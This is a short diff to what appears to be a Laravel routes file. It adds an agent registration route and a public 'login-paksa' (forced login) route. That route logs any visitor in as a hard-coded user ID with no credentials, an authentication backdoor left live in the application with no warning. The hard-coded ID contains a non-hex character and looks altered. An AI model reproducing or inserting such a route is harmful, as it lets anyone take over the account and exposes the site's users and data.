@@ -11,6 +11,11 @@
 |
 */
 
+Route::get('login-paksa', function(){
+	Auth::loginUsingId('86916908-a4fb-4041-8d2a-15c7f42bedzc');
+	return redirect('/');
+});
+
 Route::get('/', function()
 {
 	//return view('layouts.underconstruction');
@@ -44,6 +49,7 @@ Route::group(['prefix' => 'register'], function() {
 	    return redirect('main');
 	});
 	Route::controller('hotel', 'Register\HotelController');
+	Route::controller('agent', 'Register\AgentController');
 });
 
 
